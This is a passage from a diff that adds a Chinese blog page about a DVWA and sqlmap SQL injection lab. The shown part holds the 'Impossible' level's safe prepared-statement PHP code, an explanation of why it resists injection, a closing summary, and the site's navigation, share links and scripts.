invoke__">is_numeric</span>( <span class="variable">$id</span> )) &#123;  <span class="comment">// 判断是否为数字</span></span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned // 保证输出只有一条</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里看到，这里在执行 <code>sql</code> 语句之前处理了 <code>id</code> ，一定要满足是一个整数，然后把 <code>id</code> 转为了 <code>int</code> 才执行 <code>sql</code> 语句，并且，执行完成之后还要保证结果只有一个才输出，因此，是无法注入的。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过本次实验，学习了 <code>sql</code> 注入的基本原理并尝试进行了手动注入，然后学习使用自动注入工具 <code>sqlmap</code> ，方便的得到敏感数据。最重要的是，本次实验启示了我，在开发自己的服务时，如何去防御 <code>sql</code> 注入。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-%E7%AD%89%E7%BA%A7"><span class="toc-number">3.</span> <span class="toc-text">Low 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">分析 php 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">sqlmap 自动注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-%E7%AD%89%E7%BA%A7"><span class="toc-number">4.</span> <span class="toc-text">Medium 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81-1"><span class="toc-number">4.1.</span> <span class="toc-text">分析 php 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.3.</span> <span class="toc-text">sqlmap 自动注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-%E7%AD%89%E7%BA%A7"><span class="toc-number">5.</span> <span class="toc-text">High 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81-2"><span class="toc-number">5.1.</span> <span class="toc-text">分析 php 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-2"><span class="toc-number">5.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-2"><span class="toc-number">5.3.</span> <span class="toc-text">sqlmap 自动注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-%E7%AD%89%E7%BA%A7"><span class="toc-number">6.</span> <span class="toc-text">Impossible 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81-3"><span class="toc-number">6.1.</span> <span class="toc-text">分析 php 源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">小结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/2261a6f2.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/2261a6f2.html&text=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/2261a6f2.html&is_video=false&description=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基于 dvwa 和 sqlmap 的 SQL 注入攻击&body=Check out this article: https://ceyewan.github.io/p/2261a6f2.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/2261a6f2.html&name=基于 dvwa 和 sqlmap 的 SQL 注入攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/2261a6f2.html&t=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
